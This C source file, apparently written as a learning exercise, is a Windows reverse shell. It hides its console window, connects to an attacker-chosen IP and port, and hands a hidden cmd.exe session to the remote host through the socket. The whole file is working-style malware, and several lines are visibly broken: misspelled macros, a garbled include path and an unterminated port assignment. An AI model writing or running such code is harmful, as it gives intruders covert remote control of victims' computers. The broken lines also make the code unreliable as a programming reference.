#if defined(_WIN32)
#ifndef _WIN32_WINNT
#define _WINN32_WINNT 0x0600
#endif
#include <WinUser.h>
#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet./in,.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#endif
//Learning 
void showindw()
{ // this part ensures the window should be open in the stealth mode;
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
DWORD WINPAPI ThreadProc(_IN_ PVOID pParamter);
int main(int argc, char *argv[])
{
    SOCKET socks;
    struct sockaddr_in socks_shell;
    WSADATA d;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char buff[512];
    showindw();

    WSAStartup(MAKEWORD(2, 2), &d);

    char ip_addr[] = "Enter Your Ip here";
    int port = //port of your choice ;
    socks = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    socks_shell.sin_family = AF_INET;
    socks_shell.sin_port = htons(port);
    socks_shell.sin_addr.s_addr = inet_addr(ip_addr);
    int connection;
    connection = WSAConnect(socks, (SOCKADDR *)&socks_shell, sizeof(socks_shell), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR)
    {
        exit(0);
    }
    
    else
    {
        recv(socks, buff, sizeof(buff), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socks;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(buff, 0, sizeof(buff));
        WSACleanup();
        
    }
}